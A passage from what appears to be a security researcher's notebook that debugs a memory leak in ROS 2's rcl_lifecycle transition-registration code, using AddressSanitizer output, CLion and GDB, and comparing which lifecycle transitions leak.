    <p>Keeps failing however since thee terminal session we used to load the IDE didn’t export the LD_PRELOAD env. variable. The only chance is to do it before launching CLion.</p>
    <div class="sourceCode" id="cb109"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb109-1"><a href="#cb109-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@robocalypse:/opt/ros2_ws#</span> export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libasan.so.4</span>
    <span id="cb109-2"><a href="#cb109-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@robocalypse:/opt/ros2_ws#</span> clion.sh</span>
    <span id="cb109-3"><a href="#cb109-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-4"><a href="#cb109-4" aria-hidden="true" tabindex="-1"></a><span class="ex">=================================================================</span></span>
    <span id="cb109-5"><a href="#cb109-5" aria-hidden="true" tabindex="-1"></a><span class="ex">==8119==ERROR:</span> LeakSanitizer: detected memory leaks</span>
    <span id="cb109-6"><a href="#cb109-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-7"><a href="#cb109-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb109-8"><a href="#cb109-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7ff004460b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)</span></span>
    <span id="cb109-9"><a href="#cb109-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x560ebc5560dd in xmalloc (/bin/bash+0x870dd)</span></span>
    <span id="cb109-10"><a href="#cb109-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-11"><a href="#cb109-11" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY:</span> AddressSanitizer: 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">leaked</span> in 1 allocation<span class="er">(</span><span class="ex">s</span><span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb109-12"><a href="#cb109-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-13"><a href="#cb109-13" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb109-14"><a href="#cb109-14" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-15"><a href="#cb109-15" aria-hidden="true" tabindex="-1"></a><span class="ex">==8197==ERROR:</span> LeakSanitizer: detected memory leaks</span>
    <span id="cb109-16"><a href="#cb109-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-17"><a href="#cb109-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb109-18"><a href="#cb109-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7f0ffb943b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)</span></span>
    <span id="cb109-19"><a href="#cb109-19" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x55a1b3c840dd in xmalloc (/bin/bash+0x870dd)</span></span>
    <span id="cb109-20"><a href="#cb109-20" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-21"><a href="#cb109-21" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY:</span> AddressSanitizer: 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">leaked</span> in 1 allocation<span class="er">(</span><span class="ex">s</span><span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb109-22"><a href="#cb109-22" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-23"><a href="#cb109-23" aria-hidden="true" tabindex="-1"></a><span class="ex">=================================================================</span></span>
    <span id="cb109-24"><a href="#cb109-24" aria-hidden="true" tabindex="-1"></a><span class="ex">==8199==ERROR:</span> LeakSanitizer: detected memory leaks</span>
    <span id="cb109-25"><a href="#cb109-25" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-26"><a href="#cb109-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb109-27"><a href="#cb109-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7f0ffb943b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)</span></span>
    <span id="cb109-28"><a href="#cb109-28" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x55a1b3c840dd in xmalloc (/bin/bash+0x870dd)</span></span>
    <span id="cb109-29"><a href="#cb109-29" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-30"><a href="#cb109-30" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY:</span> AddressSanitizer: 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">leaked</span> in 1 allocation<span class="er">(</span><span class="ex">s</span><span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb109-31"><a href="#cb109-31" aria-hidden="true" tabindex="-1"></a><span class="ex">ERROR:</span> Cannot start CLion</span>
    <span id="cb109-32"><a href="#cb109-32" aria-hidden="true" tabindex="-1"></a><span class="ex">No</span> JDK found. Please validate either CLION_JDK, JDK_HOME or JAVA_HOME environment variable points to valid JDK installation.</span>
    <span id="cb109-33"><a href="#cb109-33" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-34"><a href="#cb109-34" aria-hidden="true" tabindex="-1"></a><span class="ex">=================================================================</span></span>
    <span id="cb109-35"><a href="#cb109-35" aria-hidden="true" tabindex="-1"></a><span class="ex">==8160==ERROR:</span> LeakSanitizer: detected memory leaks</span>
    <span id="cb109-36"><a href="#cb109-36" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-37"><a href="#cb109-37" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 40 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">2</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb109-38"><a href="#cb109-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7f0ffb943b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)</span></span>
    <span id="cb109-39"><a href="#cb109-39" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x55a1b3c840dd in xmalloc (/bin/bash+0x870dd)</span></span>
    <span id="cb109-40"><a href="#cb109-40" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-41"><a href="#cb109-41" aria-hidden="true" tabindex="-1"></a><span class="ex">Indirect</span> leak of 208 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">7</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb109-42"><a href="#cb109-42" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7f0ffb943b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)</span></span>
    <span id="cb109-43"><a href="#cb109-43" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x55a1b3c840dd in xmalloc (/bin/bash+0x870dd)</span></span>
    <span id="cb109-44"><a href="#cb109-44" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb109-45"><a href="#cb109-45" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY:</span> AddressSanitizer: 248 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">leaked</span> in 9 allocation<span class="er">(</span><span class="ex">s</span><span class="kw">)</span><span class="bu">.</span></span></code></pre></div>
    <p>Note quite, it seems that that breaks things up and messes up the paths somehow. Let’s then try a different approach:</p>
    <figure>
    <img src="background/images/2019/09/configure-the-binary-to-include-the-env-variable.png" alt="Configure the binary to include the env. variable" /><figcaption aria-hidden="true">Configure the binary to include the env. variable</figcaption>
    </figure>
    <p>This way, the binary can be launched perfectly fine and even debugged:</p>
    <figure>
    <img src="background/images/2019/09/debugging-ros-2-with-clion.png" alt="Debugging ROS 2 with CLion" /><figcaption aria-hidden="true">Debugging ROS 2 with CLion</figcaption>
    </figure>
    <p>Let’s now get back to our flaw in <code>nav2_util</code>.</p>
    <p>Managed to reproduce the issue from the Terminal of CLion:</p>
    <figure>
    <img src="background/images/2019/09/reproducing-the-flaw-https-github-com-aliasrobotics-rvd-issues-333.png" alt="Reproducing the flaw https://github.com/aliasrobotics/RVD/issues/333" /><figcaption aria-hidden="true">Reproducing the flaw https://github.com/aliasrobotics/RVD/issues/333</figcaption>
    </figure>
    <p>To debug it, had to configure also the env. variable as before:</p>
    <figure>
    <img src="background/images/2019/09/configuring-env-variables-for-the-flaw-of-study.png" alt="Configuring env. variables for the flaw of study" /><figcaption aria-hidden="true">Configuring env. variables for the flaw of study</figcaption>
    </figure>
    <p>Tremendously convenient to get hyperlinks to the code while running, this will help debugging:</p>
    <figure>
    <img src="background/images/2019/09/running-the-flaw-of-study.png" alt="Running the flaw of study" /><figcaption aria-hidden="true">Running the flaw of study</figcaption>
    </figure>
    <p>Pretty outstanding capabilities, with GDB integrated within:</p>
    <figure>
    <img src="background/images/2019/09/layout-with-clion-showing-code-variables-gdb-navigable-stack-and-more.png" alt="Layout with CLion showing code, variables, GDB, navigable stack and more" /><figcaption aria-hidden="true">Layout with CLion showing code, variables, GDB, navigable stack and more</figcaption>
    </figure>
    <p>One down side is that I’m not able to bring the memory view https://www.jetbrains.com/help/clion/memory-view.html. <strong>EDIT</strong>: I actually was able to do it https://stackoverflow.com/questions/34801691/clion-memory-view.</p>
    <p>The only thing pending is the registers which can be visualized in the GDB window.</p>
    <p>Enough of testing, let’s get back to the code analysis.</p>
    <hr />
    <p>Going back to the stack trade, the following seems relevant. Let’s study the leak in more detail:</p>
    <div class="sourceCode" id="cb110"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb110-1"><a href="#cb110-1" aria-hidden="true" tabindex="-1"></a><span class="dt">rcl_ret_t</span></span>
    <span id="cb110-2"><a href="#cb110-2" aria-hidden="true" tabindex="-1"></a>rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb110-3"><a href="#cb110-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_map_t</span> <span class="op">*</span> transition_map<span class="op">,</span></span>
    <span id="cb110-4"><a href="#cb110-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> transition<span class="op">,</span></span>
    <span id="cb110-5"><a href="#cb110-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">rcutils_allocator_t</span> <span class="op">*</span> allocator<span class="op">)</span></span>
    <span id="cb110-6"><a href="#cb110-6" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb110-7"><a href="#cb110-7" aria-hidden="true" tabindex="-1"></a>  RCUTILS_CHECK_ALLOCATOR_WITH_MSG<span class="op">(</span></span>
    <span id="cb110-8"><a href="#cb110-8" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">,</span> <span class="st">&quot;invalid allocator&quot;</span><span class="op">,</span> <span class="cf">return</span> RCL_RET_ERROR<span class="op">)</span></span>
    <span id="cb110-9"><a href="#cb110-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb110-10"><a href="#cb110-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_state_t</span> <span class="op">*</span> state <span class="op">=</span> rcl_lifecycle_get_state<span class="op">(</span>transition_map<span class="op">,</span> transition<span class="op">.</span>start<span class="op">-&gt;</span>id<span class="op">);</span></span>
    <span id="cb110-11"><a href="#cb110-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(!</span>state<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb110-12"><a href="#cb110-12" aria-hidden="true" tabindex="-1"></a>    RCL_SET_ERROR_MSG_WITH_FORMAT_STRING<span class="op">(</span><span class="st">&quot;state </span><span class="sc">%u</span><span class="st"> is not registered</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> transition<span class="op">.</span>start<span class="op">-&gt;</span>id<span class="op">);</span></span>
    <span id="cb110-13"><a href="#cb110-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> RCL_RET_ERROR<span class="op">;</span></span>
    <span id="cb110-14"><a href="#cb110-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb110-15"><a href="#cb110-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb110-16"><a href="#cb110-16" aria-hidden="true" tabindex="-1"></a>  <span class="co">// we add a new transition, so increase the size</span></span>
    <span id="cb110-17"><a href="#cb110-17" aria-hidden="true" tabindex="-1"></a>  transition_map<span class="op">-&gt;</span>transitions_size <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
    <span id="cb110-18"><a href="#cb110-18" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> <span class="op">*</span> new_transitions <span class="op">=</span> allocator<span class="op">-&gt;</span>reallocate<span class="op">(</span></span>
    <span id="cb110-19"><a href="#cb110-19" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">-&gt;</span>transitions<span class="op">,</span></span>
    <span id="cb110-20"><a href="#cb110-20" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">-&gt;</span>transitions_size <span class="op">*</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">rcl_lifecycle_transition_t</span><span class="op">),</span></span>
    <span id="cb110-21"><a href="#cb110-21" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">-&gt;</span>state<span class="op">);</span></span>
    <span id="cb110-22"><a href="#cb110-22" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(!</span>new_transitions<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb110-23"><a href="#cb110-23" aria-hidden="true" tabindex="-1"></a>    RCL_SET_ERROR_MSG<span class="op">(</span><span class="st">&quot;failed to reallocate memory for new transitions&quot;</span><span class="op">);</span></span>
    <span id="cb110-24"><a href="#cb110-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> RCL_RET_BAD_ALLOC<span class="op">;</span></span>
    <span id="cb110-25"><a href="#cb110-25" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb110-26"><a href="#cb110-26" aria-hidden="true" tabindex="-1"></a>  transition_map<span class="op">-&gt;</span>transitions <span class="op">=</span> new_transitions<span class="op">;</span></span>
    <span id="cb110-27"><a href="#cb110-27" aria-hidden="true" tabindex="-1"></a>  <span class="co">// finally set the new transition to the end of the array</span></span>
    <span id="cb110-28"><a href="#cb110-28" aria-hidden="true" tabindex="-1"></a>  transition_map<span class="op">-&gt;</span>transitions<span class="op">[</span>transition_map<span class="op">-&gt;</span>transitions_size <span class="op">-</span> <span class="dv">1</span><span class="op">]</span> <span class="op">=</span> transition<span class="op">;</span></span>
    <span id="cb110-29"><a href="#cb110-29" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb110-30"><a href="#cb110-30" aria-hidden="true" tabindex="-1"></a>  <span class="co">// we have to copy the transitons here once more to the actual state</span></span>
    <span id="cb110-31"><a href="#cb110-31" aria-hidden="true" tabindex="-1"></a>  <span class="co">// as we can&#39;t assign only the pointer. This pointer gets invalidated whenever</span></span>
    <span id="cb110-32"><a href="#cb110-32" aria-hidden="true" tabindex="-1"></a>  <span class="co">// we add a new transition and re-shuffle/re-allocate new memory for it.</span></span>
    <span id="cb110-33"><a href="#cb110-33" aria-hidden="true" tabindex="-1"></a>  state<span class="op">-&gt;</span>valid_transition_size <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
    <span id="cb110-34"><a href="#cb110-34" aria-hidden="true" tabindex="-1"></a>  </span>
    <span id="cb110-35"><a href="#cb110-35" aria-hidden="true" tabindex="-1"></a>  </span>
    <span id="cb110-36"><a href="#cb110-36" aria-hidden="true" tabindex="-1"></a>  <span class="co">//////////////////</span></span>
    <span id="cb110-37"><a href="#cb110-37" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Issue seems to be here</span></span>
    <span id="cb110-38"><a href="#cb110-38" aria-hidden="true" tabindex="-1"></a>  <span class="co">//////////////////</span></span>
    <span id="cb110-39"><a href="#cb110-39" aria-hidden="true" tabindex="-1"></a>  </span>
    <span id="cb110-40"><a href="#cb110-40" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> <span class="op">*</span> new_valid_transitions <span class="op">=</span> allocator<span class="op">-&gt;</span>reallocate<span class="op">(</span></span>
    <span id="cb110-41"><a href="#cb110-41" aria-hidden="true" tabindex="-1"></a>    state<span class="op">-&gt;</span>valid_transitions<span class="op">,</span></span>
    <span id="cb110-42"><a href="#cb110-42" aria-hidden="true" tabindex="-1"></a>    state<span class="op">-&gt;</span>valid_transition_size <span class="op">*</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">rcl_lifecycle_transition_t</span><span class="op">),</span></span>
    <span id="cb110-43"><a href="#cb110-43" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">-&gt;</span>state<span class="op">);</span></span>
    <span id="cb110-44"><a href="#cb110-44" aria-hidden="true" tabindex="-1"></a>  </span>
    <span id="cb110-45"><a href="#cb110-45" aria-hidden="true" tabindex="-1"></a>  <span class="co">//////////////////</span></span>
    <span id="cb110-46"><a href="#cb110-46" aria-hidden="true" tabindex="-1"></a>  </span>
    <span id="cb110-47"><a href="#cb110-47" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(!</span>new_valid_transitions<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb110-48"><a href="#cb110-48" aria-hidden="true" tabindex="-1"></a>    RCL_SET_ERROR_MSG<span class="op">(</span><span class="st">&quot;failed to reallocate memory for new transitions on state&quot;</span><span class="op">);</span></span>
    <span id="cb110-49"><a href="#cb110-49" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> RCL_RET_ERROR<span class="op">;</span></span>
    <span id="cb110-50"><a href="#cb110-50" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb110-51"><a href="#cb110-51" aria-hidden="true" tabindex="-1"></a>  state<span class="op">-&gt;</span>valid_transitions <span class="op">=</span> new_valid_transitions<span class="op">;</span></span>
    <span id="cb110-52"><a href="#cb110-52" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb110-53"><a href="#cb110-53" aria-hidden="true" tabindex="-1"></a>  state<span class="op">-&gt;</span>valid_transitions<span class="op">[</span>state<span class="op">-&gt;</span>valid_transition_size <span class="op">-</span> <span class="dv">1</span><span class="op">]</span> <span class="op">=</span> transition<span class="op">;</span></span>
    <span id="cb110-54"><a href="#cb110-54" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb110-55"><a href="#cb110-55" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> RCL_RET_OK<span class="op">;</span></span>
    <span id="cb110-56"><a href="#cb110-56" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>Further looking into the dump, it seems the issue is happening over differen parts of the code but always on the <code>rcl_lifecycle_register_transition</code> function and always at `<code>/opt/ros2_ws/src/ros2/rcl/rcl_lifecycle/src/transition_map.c:131</code> leaking 96 bytes which is equal to 3 pointers of 32 bytes.</p>
    <p>Diving a bit more into the issue, it actually seems that it happens only in specific transitions and again, only in the second element of the transition (which probably corresponds to line 131 as pointed out above). The places where it happens are characterized by the following:</p>
    <div class="sourceCode" id="cb111"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb111-1"><a href="#cb111-1" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from configuring to errorprocessing</span></span>
    <span id="cb111-2"><a href="#cb111-2" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from cleaniningup to errorprocessing</span></span>
    <span id="cb111-3"><a href="#cb111-3" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from activating to errorprocessing</span></span>
    <span id="cb111-4"><a href="#cb111-4" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from deactivating to errorprocessing</span></span>
    <span id="cb111-5"><a href="#cb111-5" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from unconfigured to shuttingdown</span></span>
    <span id="cb111-6"><a href="#cb111-6" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from inactive to shuttingdown</span></span>
    <span id="cb111-7"><a href="#cb111-7" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from active to shuttingdown</span></span>
    <span id="cb111-8"><a href="#cb111-8" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from shutting down to errorprocessing</span></span>
    <span id="cb111-9"><a href="#cb111-9" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from errorprocessing to finalized</span></span></code></pre></div>
    <p>It does not happen in places such as:</p>
    <div class="sourceCode" id="cb112"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb112-1"><a href="#cb112-1" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from unconfigured to configuring</span></span>
    <span id="cb112-2"><a href="#cb112-2" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from configuring to inactive</span></span>
    <span id="cb112-3"><a href="#cb112-3" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from configuring to unconfigured</span></span>
    <span id="cb112-4"><a href="#cb112-4" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from inactive to cleaningup</span></span>
    <span id="cb112-5"><a href="#cb112-5" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from cleaningup to unconfigured</span></span>
    <span id="cb112-6"><a href="#cb112-6" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from cleaningup to inactive</span></span>
    <span id="cb112-7"><a href="#cb112-7" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from inactive to activating</span></span>
    <span id="cb112-8"><a href="#cb112-8" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span></code></pre></div>
    <p>and others with a somewhat non-final second state.</p>
    <p>It seems reasonable to consider that only in those transition with an state that leads to an end there is a leak. Let further understand the code to try and figure out what’s leaking.</p>
    <p><strong>EDIT</strong>: Previous assumption might not be true. States such as <code>// register transition from shutting down to finalized</code> do not leak.</p>
    <p>Interesting to note the following two pieces of code:</p>
    <div class="sourceCode" id="cb113"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb113-1"><a href="#cb113-1" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from errorprocessing to finalized</span></span>
    <span id="cb113-2"><a href="#cb113-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb113-3"><a href="#cb113-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_error_failure <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb113-4"><a href="#cb113-4" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_failure_label<span class="op">,</span></span>
    <span id="cb113-5"><a href="#cb113-5" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ERROR_FAILURE<span class="op">,</span></span>
    <span id="cb113-6"><a href="#cb113-6" aria-hidden="true" tabindex="-1"></a>    errorprocessing_state<span class="op">,</span> finalized_state</span>
    <span id="cb113-7"><a href="#cb113-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb113-8"><a href="#cb113-8" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb113-9"><a href="#cb113-9" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb113-10"><a href="#cb113-10" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_error_failure<span class="op">,</span></span>
    <span id="cb113-11"><a href="#cb113-11" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
    <span id="cb113-12"><a href="#cb113-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb113-13"><a href="#cb113-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb113-14"><a href="#cb113-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb113-15"><a href="#cb113-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb113-16"><a href="#cb113-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb113-17"><a href="#cb113-17" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from errorprocessing to finalized</span></span>
    <span id="cb113-18"><a href="#cb113-18" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb113-19"><a href="#cb113-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_error_error <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb113-20"><a href="#cb113-20" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_error_label<span class="op">,</span></span>
    <span id="cb113-21"><a href="#cb113-21" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ERROR_ERROR<span class="op">,</span></span>
    <span id="cb113-22"><a href="#cb113-22" aria-hidden="true" tabindex="-1"></a>    errorprocessing_state<span class="op">,</span> finalized_state</span>
    <span id="cb113-23"><a href="#cb113-23" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb113-24"><a href="#cb113-24" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb113-25"><a href="#cb113-25" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb113-26"><a href="#cb113-26" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_error_error<span class="op">,</span></span>
    <span id="cb113-27"><a href="#cb113-27" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
    <span id="cb113-28"><a href="#cb113-28" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb113-29"><a href="#cb113-29" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb113-30"><a href="#cb113-30" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb113-31"><a href="#cb113-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>The first piece does not leak while the second one <strong>does leak</strong>. The differences: - First one using <code>rcl_lifecycle_transition_failure_label</code> and <code>lifecycle_msgs__msg__Transition__TRANSITION_ON_ERROR_FAILURE</code> - (<strong>leaky</strong>) Second one using <code>rcl_lifecycle_transition_error_label</code> and <code>lifecycle_msgs__msg__Transition__TRANSITION_ON_ERROR_ERROR</code></p>
    <p>This does not lead to a lot. Let’s analyze and see if there’re more cases such as the one above. Found other two cases worth studying. In total, have three cases that are worth looking deeply into them:</p>
    <h5 id="case-1">Case 1</h5>
    <p>Leak in the last case</p>
    <div class="sourceCode" id="cb114"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb114-1"><a href="#cb114-1" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from errorprocessing to finalized</span></span>
    <span id="cb114-2"><a href="#cb114-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb114-3"><a href="#cb114-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_error_failure <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb114-4"><a href="#cb114-4" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_failure_label<span class="op">,</span></span>
    <span id="cb114-5"><a href="#cb114-5" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ERROR_FAILURE<span class="op">,</span></span>
    <span id="cb114-6"><a href="#cb114-6" aria-hidden="true" tabindex="-1"></a>    errorprocessing_state<span class="op">,</span> finalized_state</span>
    <span id="cb114-7"><a href="#cb114-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb114-8"><a href="#cb114-8" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb114-9"><a href="#cb114-9" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb114-10"><a href="#cb114-10" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_error_failure<span class="op">,</span></span>
    <span id="cb114-11"><a href="#cb114-11" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
